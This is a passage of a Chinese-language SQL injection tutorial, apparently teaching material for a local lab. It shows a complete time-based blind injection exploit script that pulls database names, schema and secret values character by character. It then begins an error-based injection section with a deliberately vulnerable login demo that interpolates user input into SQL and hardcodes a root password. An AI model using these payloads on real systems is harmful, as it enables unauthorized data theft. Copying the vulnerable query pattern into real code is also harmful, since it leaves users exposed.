<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">raise</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">Exception</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;timeout&quot;</span><span style="color:#E1E4E8;">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8;">signal.signal(signal.</span><span style="color:#79B8FF;">SIGALRM</span><span style="color:#E1E4E8;">, handler)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583;">def</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">escape_string</span><span style="color:#E1E4E8;">(c):</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">return</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;</span><span style="color:#79B8FF;">\\\\</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">+</span><span style="color:#E1E4E8;"> c </span><span style="color:#F97583;">if</span><span style="color:#E1E4E8;"> c </span><span style="color:#F97583;">in</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;.+*&quot;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">else</span><span style="color:#E1E4E8;"> c</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583;">def</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">exp</span><span style="color:#E1E4E8;">():</span></span>
<span class="line"><span style="color:#E1E4E8;">    payload_template </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;Liki4&#39; AND if(</span><span style="color:#79B8FF;">{exp}</span><span style="color:#9ECBFF;">,SLEEP(1),0);#&quot;</span></span>
<span class="line"><span style="color:#E1E4E8;">    space </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> string.ascii_letters </span><span style="color:#F97583;">+</span><span style="color:#E1E4E8;"> string.digits </span><span style="color:#F97583;">+</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39; _:,$.&#39;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8;">    exp_template </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;@@version RLIKE &#39;^</span><span style="color:#79B8FF;">{c}</span><span style="color:#9ECBFF;">&#39;&quot;</span></span>
<span class="line"><span style="color:#E1E4E8;">    exp_template </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;DATABASE() RLIKE &#39;^</span><span style="color:#79B8FF;">{c}</span><span style="color:#9ECBFF;">&#39;&quot;</span></span>
<span class="line"><span style="color:#E1E4E8;">    exp_template </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;(SELECT GROUP_CONCAT(table_name, &#39;:&#39;, column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = DATABASE()) RLIKE &#39;^</span><span style="color:#79B8FF;">{c}</span><span style="color:#9ECBFF;">&#39;&quot;</span></span>
<span class="line"><span style="color:#E1E4E8;">    exp_template </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;(SELECT binary GROUP_CONCAT(secret_string) FROM secret) RLIKE &#39;^</span><span style="color:#79B8FF;">{c}</span><span style="color:#9ECBFF;">&#39;&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#79B8FF;">print</span><span style="color:#E1E4E8;">(exp_template)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8;">    Flag </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">True</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8;">    data </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">while</span><span style="color:#E1E4E8;"> Flag:</span></span>
<span class="line"><span style="color:#E1E4E8;">        ori_stdout </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> sys.stdout</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#F97583;">for</span><span style="color:#E1E4E8;"> c </span><span style="color:#F97583;">in</span><span style="color:#E1E4E8;"> space:</span></span>
<span class="line"><span style="color:#E1E4E8;">            payload </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> payload_template.format(</span><span style="color:#FFAB70;">exp</span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;">exp_template.format(</span><span style="color:#FFAB70;">c</span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;">data</span><span style="color:#F97583;">+</span><span style="color:#E1E4E8;">c))</span></span>
<span class="line"><span style="color:#E1E4E8;">            sys.stdin </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> io.StringIO(payload </span><span style="color:#F97583;">+</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;</span><span style="color:#79B8FF;">\\n</span><span style="color:#9ECBFF;">555_i_dont_know_password&#39;</span><span style="color:#E1E4E8;">)</span></span>
<span class="line"><span style="color:#E1E4E8;">            res </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> sys.stdout </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> io.StringIO()</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8;">            signal.alarm(</span><span style="color:#79B8FF;">1</span><span style="color:#E1E4E8;">)</span></span>
<span class="line"><span style="color:#E1E4E8;">            </span><span style="color:#F97583;">try</span><span style="color:#E1E4E8;">:</span></span>
<span class="line"><span style="color:#E1E4E8;">                main()</span></span>
<span class="line"><span style="color:#E1E4E8;">                </span><span style="color:#79B8FF;">print</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;timeout&quot;</span><span style="color:#E1E4E8;">)</span></span>
<span class="line"><span style="color:#E1E4E8;">            </span><span style="color:#F97583;">except</span><span style="color:#E1E4E8;">:</span></span>
<span class="line"><span style="color:#E1E4E8;">                </span><span style="color:#79B8FF;">print</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;bingooo&quot;</span><span style="color:#E1E4E8;">)</span></span>
<span class="line"><span style="color:#E1E4E8;">            </span></span>
<span class="line"><span style="color:#E1E4E8;">            output </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">str</span><span style="color:#E1E4E8;">(res.getvalue())</span></span>
<span class="line"><span style="color:#E1E4E8;">            </span><span style="color:#F97583;">if</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;timeout&quot;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">in</span><span style="color:#E1E4E8;"> output:</span></span>
<span class="line"><span style="color:#E1E4E8;">                </span><span style="color:#F97583;">continue</span></span>
<span class="line"><span style="color:#E1E4E8;">            </span><span style="color:#F97583;">if</span><span style="color:#E1E4E8;"> c </span><span style="color:#F97583;">==</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;$&quot;</span><span style="color:#E1E4E8;">:</span></span>
<span class="line"><span style="color:#E1E4E8;">                Flag </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">False</span></span>
<span class="line"><span style="color:#E1E4E8;">                </span><span style="color:#F97583;">break</span></span>
<span class="line"><span style="color:#E1E4E8;">            </span><span style="color:#F97583;">if</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;bingooo&quot;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">in</span><span style="color:#E1E4E8;"> output:</span></span>
<span class="line"><span style="color:#E1E4E8;">                data </span><span style="color:#F97583;">+=</span><span style="color:#E1E4E8;"> c</span></span>
<span class="line"><span style="color:#E1E4E8;">                </span><span style="color:#F97583;">break</span></span>
<span class="line"><span style="color:#E1E4E8;">        sys.stdout </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> ori_stdout</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#F97583;">if</span><span style="color:#E1E4E8;"> Flag:</span></span>
<span class="line"><span style="color:#E1E4E8;">            </span><span style="color:#79B8FF;">print</span><span style="color:#E1E4E8;">(data, </span><span style="color:#FFAB70;">end</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#79B8FF;">\\r</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#E1E4E8;">)</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#F97583;">else</span><span style="color:#E1E4E8;">:</span></span>
<span class="line"><span style="color:#E1E4E8;">            </span><span style="color:#79B8FF;">print</span><span style="color:#E1E4E8;">(data)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583;">if</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">__name__</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">==</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;__main__&quot;</span><span style="color:#E1E4E8;">:</span></span>
<span class="line"><span style="color:#E1E4E8;">    exp()</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">from</span><span style="color:#24292E;"> mysqli_invisible_time </span><span style="color:#D73A49;">import</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">*</span></span>
<span class="line"><span style="color:#D73A49;">import</span><span style="color:#24292E;"> string</span></span>
<span class="line"><span style="color:#D73A49;">import</span><span style="color:#24292E;"> io</span></span>
<span class="line"><span style="color:#D73A49;">import</span><span style="color:#24292E;"> sys</span></span>
<span class="line"><span style="color:#D73A49;">import</span><span style="color:#24292E;"> signal</span></span>
<span class="line"></span>
<span class="line"><span style="color:#D73A49;">def</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">handler</span><span style="color:#24292E;">(signum, frame):</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">raise</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">Exception</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;timeout&quot;</span><span style="color:#24292E;">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#24292E;">signal.signal(signal.</span><span style="color:#005CC5;">SIGALRM</span><span style="color:#24292E;">, handler)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#D73A49;">def</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">escape_string</span><span style="color:#24292E;">(c):</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">return</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;</span><span style="color:#005CC5;">\\\\</span><span style="color:#032F62;">&quot;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">+</span><span style="color:#24292E;"> c </span><span style="color:#D73A49;">if</span><span style="color:#24292E;"> c </span><span style="color:#D73A49;">in</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;.+*&quot;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">else</span><span style="color:#24292E;"> c</span></span>
<span class="line"></span>
<span class="line"><span style="color:#D73A49;">def</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">exp</span><span style="color:#24292E;">():</span></span>
<span class="line"><span style="color:#24292E;">    payload_template </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;Liki4&#39; AND if(</span><span style="color:#005CC5;">{exp}</span><span style="color:#032F62;">,SLEEP(1),0);#&quot;</span></span>
<span class="line"><span style="color:#24292E;">    space </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> string.ascii_letters </span><span style="color:#D73A49;">+</span><span style="color:#24292E;"> string.digits </span><span style="color:#D73A49;">+</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39; _:,$.&#39;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#24292E;">    exp_template </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;@@version RLIKE &#39;^</span><span style="color:#005CC5;">{c}</span><span style="color:#032F62;">&#39;&quot;</span></span>
<span class="line"><span style="color:#24292E;">    exp_template </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;DATABASE() RLIKE &#39;^</span><span style="color:#005CC5;">{c}</span><span style="color:#032F62;">&#39;&quot;</span></span>
<span class="line"><span style="color:#24292E;">    exp_template </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;(SELECT GROUP_CONCAT(table_name, &#39;:&#39;, column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = DATABASE()) RLIKE &#39;^</span><span style="color:#005CC5;">{c}</span><span style="color:#032F62;">&#39;&quot;</span></span>
<span class="line"><span style="color:#24292E;">    exp_template </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;(SELECT binary GROUP_CONCAT(secret_string) FROM secret) RLIKE &#39;^</span><span style="color:#005CC5;">{c}</span><span style="color:#032F62;">&#39;&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#005CC5;">print</span><span style="color:#24292E;">(exp_template)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#24292E;">    Flag </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">True</span></span>
<span class="line"></span>
<span class="line"><span style="color:#24292E;">    data </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">while</span><span style="color:#24292E;"> Flag:</span></span>
<span class="line"><span style="color:#24292E;">        ori_stdout </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> sys.stdout</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#D73A49;">for</span><span style="color:#24292E;"> c </span><span style="color:#D73A49;">in</span><span style="color:#24292E;"> space:</span></span>
<span class="line"><span style="color:#24292E;">            payload </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> payload_template.format(</span><span style="color:#E36209;">exp</span><span style="color:#D73A49;">=</span><span style="color:#24292E;">exp_template.format(</span><span style="color:#E36209;">c</span><span style="color:#D73A49;">=</span><span style="color:#24292E;">data</span><span style="color:#D73A49;">+</span><span style="color:#24292E;">c))</span></span>
<span class="line"><span style="color:#24292E;">            sys.stdin </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> io.StringIO(payload </span><span style="color:#D73A49;">+</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;</span><span style="color:#005CC5;">\\n</span><span style="color:#032F62;">555_i_dont_know_password&#39;</span><span style="color:#24292E;">)</span></span>
<span class="line"><span style="color:#24292E;">            res </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> sys.stdout </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> io.StringIO()</span></span>
<span class="line"></span>
<span class="line"><span style="color:#24292E;">            signal.alarm(</span><span style="color:#005CC5;">1</span><span style="color:#24292E;">)</span></span>
<span class="line"><span style="color:#24292E;">            </span><span style="color:#D73A49;">try</span><span style="color:#24292E;">:</span></span>
<span class="line"><span style="color:#24292E;">                main()</span></span>
<span class="line"><span style="color:#24292E;">                </span><span style="color:#005CC5;">print</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;timeout&quot;</span><span style="color:#24292E;">)</span></span>
<span class="line"><span style="color:#24292E;">            </span><span style="color:#D73A49;">except</span><span style="color:#24292E;">:</span></span>
<span class="line"><span style="color:#24292E;">                </span><span style="color:#005CC5;">print</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;bingooo&quot;</span><span style="color:#24292E;">)</span></span>
<span class="line"><span style="color:#24292E;">            </span></span>
<span class="line"><span style="color:#24292E;">            output </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">str</span><span style="color:#24292E;">(res.getvalue())</span></span>
<span class="line"><span style="color:#24292E;">            </span><span style="color:#D73A49;">if</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;timeout&quot;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">in</span><span style="color:#24292E;"> output:</span></span>
<span class="line"><span style="color:#24292E;">                </span><span style="color:#D73A49;">continue</span></span>
<span class="line"><span style="color:#24292E;">            </span><span style="color:#D73A49;">if</span><span style="color:#24292E;"> c </span><span style="color:#D73A49;">==</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;$&quot;</span><span style="color:#24292E;">:</span></span>
<span class="line"><span style="color:#24292E;">                Flag </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">False</span></span>
<span class="line"><span style="color:#24292E;">                </span><span style="color:#D73A49;">break</span></span>
<span class="line"><span style="color:#24292E;">            </span><span style="color:#D73A49;">if</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;bingooo&quot;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">in</span><span style="color:#24292E;"> output:</span></span>
<span class="line"><span style="color:#24292E;">                data </span><span style="color:#D73A49;">+=</span><span style="color:#24292E;"> c</span></span>
<span class="line"><span style="color:#24292E;">                </span><span style="color:#D73A49;">break</span></span>
<span class="line"><span style="color:#24292E;">        sys.stdout </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> ori_stdout</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#D73A49;">if</span><span style="color:#24292E;"> Flag:</span></span>
<span class="line"><span style="color:#24292E;">            </span><span style="color:#005CC5;">print</span><span style="color:#24292E;">(data, </span><span style="color:#E36209;">end</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&quot;</span><span style="color:#005CC5;">\\r</span><span style="color:#032F62;">&quot;</span><span style="color:#24292E;">)</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#D73A49;">else</span><span style="color:#24292E;">:</span></span>
<span class="line"><span style="color:#24292E;">            </span><span style="color:#005CC5;">print</span><span style="color:#24292E;">(data)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#D73A49;">if</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">__name__</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">==</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;__main__&quot;</span><span style="color:#24292E;">:</span></span>
<span class="line"><span style="color:#24292E;">    exp()</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br></div></div><p><img src="https://cdn.xyxsw.site/boxcnsStdHC5VmBylyx6S7hakEb.png" alt=""></p><h3 id="基于报错的-sql-注入-todo" tabindex="-1">基于报错的 SQL 注入 (TODO) <a class="header-anchor" href="#基于报错的-sql-注入-todo" aria-label="Permalink to &quot;基于报错的 SQL 注入 (TODO)&quot;">​</a></h3><p>有的时候当 Web 应用虽然没有回显，但开启了 Debug 模式或者开启了显示报错的话，一旦 SQL 语句执行报错了，那么就会将错误信息显示出来，那报错的信息能否成为一种带出关键信息的回显呢？</p><p>可以！</p><p>让我们再对 demo 的代码做一些修改，用来探究以下如何利用报错来外带信息。</p><div class="language-python vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">python</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#6A737D;">#!/usr/bin/python</span></span>
<span class="line"><span style="color:#6A737D;"># -*- coding: UTF-8 -*-</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583;">from</span><span style="color:#E1E4E8;"> sqlalchemy </span><span style="color:#F97583;">import</span><span style="color:#E1E4E8;"> create_engine, exc</span></span>
<span class="line"><span style="color:#F97583;">from</span><span style="color:#E1E4E8;"> hashlib </span><span style="color:#F97583;">import</span><span style="color:#E1E4E8;"> sha256</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8;">engine </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> create_engine(</span><span style="color:#9ECBFF;">&quot;mysql+pymysql://root:TjsDgwGPz5ANbJUU@127.0.0.1:3305/sqli&quot;</span><span style="color:#E1E4E8;">, </span><span style="color:#FFAB70;">max_overflow</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">5</span><span style="color:#E1E4E8;">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583;">def</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">query</span><span style="color:#E1E4E8;">(username, password):</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">with</span><span style="color:#E1E4E8;"> engine.connect() </span><span style="color:#F97583;">as</span><span style="color:#E1E4E8;"> con:</span></span>
<span class="line"><span style="color:#E1E4E8;">        query_exec </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">f</span><span style="color:#9ECBFF;">&quot;SELECT password FROM users WHERE username = &#39;</span><span style="color:#79B8FF;">{</span><span style="color:#E1E4E8;">username</span><span style="color:#79B8FF;">}</span><span style="color:#9ECBFF;">&#39;&quot;</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#79B8FF;">print</span><span style="color:#E1E4E8;">(query_exec)</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#F97583;">try</span><span style="color:#E1E4E8;">:</span></span>
<span class="line"><span style="color:#E1E4E8;">            </span><span style="color:#F97583;">if</span><span style="color:#E1E4E8;"> con.execute(query_exec).scalar():</span></span>
<span class="line"><span style="color:#E1E4E8;">                passhash </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> con.execute(query_exec).fetchone()[</span><span style="color:#79B8FF;">0</span><span style="color:#E1E4E8;">]</span></span>
<span class="line"><span style="color:#E1E4E8;">                </span><span style="color:#F97583;">return</span><span style="color:#E1E4E8;"> passhash </span><span style="color:#F97583;">==</span><span style="color:#E1E4E8;"> sha256(password.encode()).hexdigest()</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#F97583;">except</span><span style="color:#E1E4E8;"> exc.SQLAlchemyError </span><span style="color:#F97583;">as</span><span style="color:#E1E4E8;"> e:</span></span>
<span class="line"><span style="color:#E1E4E8;">            </span><span style="color:#79B8FF;">print</span><span style="color:#E1E4E8;">(</span><span style="color:#79B8FF;">str</span><span style="color:#E1E4E8;">(e.</span><span style="color:#79B8FF;">__dict__</span><span style="color:#E1E4E8;">[</span><span style="color:#9ECBFF;">&#39;orig&#39;</span><span style="color:#E1E4E8;">])) </span><span style="color:#6A737D;"># 输出捕获的错误信息</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#F97583;">return</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">False</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583;">def</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">main</span><span style="color:#E1E4E8;">():</span></span>
<span class="line"><span style="color:#E1E4E8;">    username </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">input</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;Give me your username: &quot;</span><span style="color:#E1E4E8;">)</span></span>
<span class="line"><span style="color:#E1E4E8;">    password </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">input</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;Give me your password: &quot;</span><span style="color:#E1E4E8;">)</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#79B8FF;">print</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;Login success&quot;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">if</span><span style="color:#E1E4E8;"> query(username, password) </span><span style="color:#F97583;">else</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;Login failed&quot;</span><span style="color:#E1E4E8;">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583;">if</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">__name__</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">==</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;__main__&quot;</span><span style="color:#E1E4E8;">:</span></span>
<span class="line"><span style="color:#E1E4E8;">    main()</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#6A737D;">#!/usr/bin/python</span></span>
<span class="line"><span style="color:#6A737D;"># -*- coding: UTF-8 -*-</span></span>
<span class="line"></span>
<span class="line"><span style="color:#D73A49;">from</span><span style="color:#24292E;"> sqlalchemy </span><span style="color:#D73A49;">import</span><span style="color:#24292E;"> create_engine, exc</span></span>
<span class="line"><span style="color:#D73A49;">from</span><span style="color:#24292E;"> hashlib </span><span style="color:#D73A49;">import</span><span style="color:#24292E;"> sha256</span></span>
<span class="line"></span>
<span class="line"><span style="color:#24292E;">engine </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> create_engine(</span><span style="color:#032F62;">&quot;mysql+pymysql://root:TjsDgwGPz5ANbJUU@127.0.0.1:3305/sqli&quot;</span><span style="color:#24292E;">, </span><span style="color:#E36209;">max_overflow</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">5</span><span style="color:#24292E;">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#D73A49;">def</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">query</span><span style="color:#24292E;">(username, password):</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">with</span><span style="color:#24292E;"> engine.connect() </span><span style="color:#D73A49;">as</span><span style="color:#24292E;"> con:</span></span>
<span class="line"><span style="color:#24292E;">        query_exec </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">f</span><span style="color:#032F62;">&quot;SELECT password FROM users WHERE username = &#39;</span><span style="color:#005CC5;">{</span><span style="color:#24292E;">username</span><span style="color:#005CC5;">}</span><span style="color:#032F62;">&#39;&quot;</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#005CC5;">print</span><span style="color:#24292E;">(query_exec)</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#D73A49;">try</span><span style="color:#24292E;">:</span></span>
<span class="line"><span style="color:#24292E;">            </span><span style="color:#D73A49;">if</span><span style="color:#24292E;"> con.execute(query_exec).scalar():</span></span>
<span class="line"><span style="color:#24292E;">                passhash </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> con.execute(query_exec).fetchone()[</span><span style="color:#005CC5;">0</span><span style="color:#24292E;">]</span></span>
<span class="line"><span style="color:#24292E;">                </span><span style="color:#D73A49;">return</span><span style="color:#24292E;"> passhash </span><span style="color:#D73A49;">==</span><span style="color:#24292E;"> sha256(password.encode()).hexdigest()</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#D73A49;">except</span><span style="color:#24292E;"> exc.SQLAlchemyError </span><span style="color:#D73A49;">as</span><span style="color:#24292E;"> e:</span></span>
<span class="line"><span style="color:#24292E;">            </span><span style="color:#005CC5;">print</span><span style="color:#24292E;">(</span><span style="color:#005CC5;">str</span><span style="color:#24292E;">(e.</span><span style="color:#005CC5;">__dict__</span><span style="color:#24292E;">[</span><span style="color:#032F62;">&#39;orig&#39;</span><span style="color:#24292E;">])) </span><span style="color:#6A737D;"># 输出捕获的错误信息</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#D73A49;">return</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">False</span></span>
<span class="line"></span>
<span class="line"><span style="color:#D73A49;">def</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">main</span><span style="color:#24292E;">():</span></span>
<span class="line"><span style="color:#24292E;">    username </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">input</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;Give me your username: &quot;</span><span style="color:#24292E;">)</span></span>
